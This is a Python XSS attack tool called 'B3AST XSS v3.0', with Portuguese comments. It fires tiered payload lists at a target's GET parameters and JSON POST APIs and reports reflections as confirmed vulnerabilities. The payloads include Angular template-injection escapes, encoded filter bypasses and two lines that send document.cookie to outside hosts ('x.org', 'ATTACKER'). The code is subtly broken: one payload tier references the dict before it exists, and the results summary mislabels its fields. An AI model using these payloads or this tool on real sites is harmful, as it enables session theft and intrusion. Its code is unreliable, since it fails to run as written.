#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
B3AST XSS v3.0 — Reflected/DOM/Angular Template Injection/JSON API
Foco: apps Angular + APIs .NET parametrizadas (JSON POST).
Uso: python3 b3ast_xss.py "http://alvo.com/search?q=teste"
"""
import sys, re, json
from urllib.parse import urlparse, parse_qsl, urlencode
from b3ast_core import C, banner, log_ok, log_vuln, log_fail, log_warn, log_info, log_dim, \
    titulo_fase, safe_exec, salvar_relatorio, menu_niveis, http_request, fingerprint_tecnologia

try:
    from bs4 import BeautifulSoup
except ImportError:
    sys.exit("[!] pip3 install beautifulsoup4")

PAYLOADS = {
    "1": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg/onload=alert(1)>',
    ],
    "2": [
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '{{7*7}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{_self.$eval("alert(1)")}}',
        '<div [innerHTML]="\'<img src=x onerror=alert(1)>\'"></div>',
        '</script><script>alert(1)</script>',
        'onmouseover=alert(1) x="',
    ],
    "3": [
        '{{constructor.constructor("fetch(\'//x.org/\'+document.cookie)")()}}',
        'javascript:/*--></title></style></textarea></script></svg><script>alert(1)</script>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
        '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
        '<object data=javascript:alert(1)>',
        '<form><button formaction=javascript:alert(1)>X',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%3C%73%63%72%69%70%74%3Ealert(1)%3C%2F%73%63%72%69%70%74%3E',
        '<ScRiPt>AlErT(1)</ScRiPt>',
        '<<script>alert(1);//<</script>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    ],
    "4": PAYLOADS["3"] + [
        '<script>fetch("http://ATTACKER/"+document.cookie)</script>',
        '<svg/onload=eval(atob("YWxlcnQoMSk="))>',
        '{{this.constructor.prototype.__lookupGetter__("constructor")("alert(1)")()}}',
        '<a href="jAvAsCrIpT:alert(1)">c</a>',
        '<xss id=x onfocus=alert(document.cookie) tabindex=1>#x</xss>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<link rel=stylesheet href=javascript:alert(1)>',
        '<style>@import "javascript:alert(1)";</style>',
        '{"$where":"alert(1)"}',
        '{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}',
    ],
}

def refletido(payload, html):
    """Detecta reflexão exata, parcial e em contexto perigoso."""
    core = re.sub(r"['\"<>/ ]", "", payload)[:20]
    if not core or core not in re.sub(r"['\"<>/ ]", "", html):
        return None
    ctx = "REFLECTED"
    if "{{" in payload and ("49" in html or "alert" in html.split("{{")[-1]):
        ctx = "ANGULAR TEMPLATE INJECTION (executável!)"
    soup = safe_exec(lambda: BeautifulSoup(html, "html.parser"), default=None)
    if soup:
        for sc in soup.find_all("script"):
            if core[:10] in sc.get_text():
                ctx = "DENTRO DE <script> (executável!)"
                break
        for tag in soup.find_all(re.compile(r"^(script|img|svg|iframe|body|input|details|video)$")):
            for v in (tag.attrs or {}).values():
                if isinstance(v, str) and core[:10] in v:
                    ctx = f"EVENT HANDLER em <{tag.name}> (executável!)"
    return ctx

def testar_param_get(url, payload):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        return []
    vulns = []
    for p in params:
        teste = params.copy(); teste[p] = payload
        alvo = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(teste)}"
        r = http_request(alvo)
        if r:
            ctx = safe_exec(refletido, payload, r.text, default=None, contexto="reflexão")
            if ctx:
                vulns.append((p, ctx, payload, alvo))
    return vulns

def testar_json_post(url, payload):
    """Testa injeção em APIs JSON .NET/CQRS (POST com body)."""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    corpos = [
        {"id": payload, "action": "query"},
        {"query": payload, "filter": payload},
        {"searchTerm": payload},
        {"dto": {"name": payload, "value": payload}},
    ]
    vulns = []
    for body in corpos:
        r = http_request(base, method="POST", json=body)
        if r and r.status_code < 400:
            ctx = safe_exec(refletido, payload, r.text, default=None, contexto="json-post")
            if ctx:
                vulns.append(("JSON-POST", ctx, json.dumps(body)[:80], base))
    return vulns

def main():
    if len(sys.argv) < 2:
        log_fail(f'Uso: python3 {sys.argv[0]} "http://alvo.com/search?q=teste"')
        log_warn("URL precisa ter ?param=valor para testar GET.")
        sys.exit(1)
    url = sys.argv[1]

    banner()
    nivel = menu_niveis()

    # Fingerprint
    titulo_fase("FINGERPRINT")
    r = safe_exec(http_request, url, default=None, contexto="fp")
    techs = []
    if r:
        techs = fingerprint_tecnologia(r.text, r.headers)
        for t in techs:
            log_ok(f"Detectado: {C.BOLD}{t}{C.END}")
        if any("Angular" in t for t in techs):
            log_warn("Angular detectado — payloads de template injection priorizados.")

    titulo_fase(f"B3AST XSS — NÍVEL {nivel}")
    payloads = PAYLOADS.get(nivel, PAYLOADS["1"])
    todas = []
    total = len(payloads)
    for i, pl in enumerate(payloads, 1):
        log_info(f"[{i}/{total}] {C.WHITE}{pl[:65]}{C.END}")
        for v in safe_exec(testar_param_get, url, pl, default=[], contexto="GET"):
            log_vuln(f"GET param '{v[0]}' → {v[1]}")
            todas.append(v)
        if nivel in ("3", "4"):
            for v in safe_exec(testar_json_post, url, pl, default=[], contexto="JSON"):
                log_vuln(f"JSON POST → {v[1]}")
                todas.append(v)
        if not todas or todas[-1][2] != pl:
            log_dim("    └─ não refletido")

    # Sumário
    print(f"\n{C.RED2}{C.BOLD}{'━'*64}")
    if todas:
        print(f"  ☠ {len(todas)} VULNERABILIDADES XSS CONFIRMADAS")
        print(f"{'━'*64}{C.END}")
        for pl, p, ctx, alvo in todas:
            print(f"  {C.RED2}→ {C.BOLD}{p}{C.END} | {ctx}")
            print(f"  {C.WHITE}  payload: {pl[:70]}{C.END}")
            print(f"  {C.GRAY}  url: {alvo[:90]}{C.END}")
    else:
        print(f"{'━'*64}{C.END}")
        log_ok("Nenhuma XSS refletida confirmada.")

    salvar_relatorio("b3ast_xss", urlparse(url).netloc,
                     [(f"VULN: {p} | {ctx}", f"payload: {pl}\nurl: {alvo}") for pl, p, ctx, alvo in todas]
                     or [("sem achados", "nenhuma XSS confirmada")])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_warn("Interrompido."); sys.exit(130)
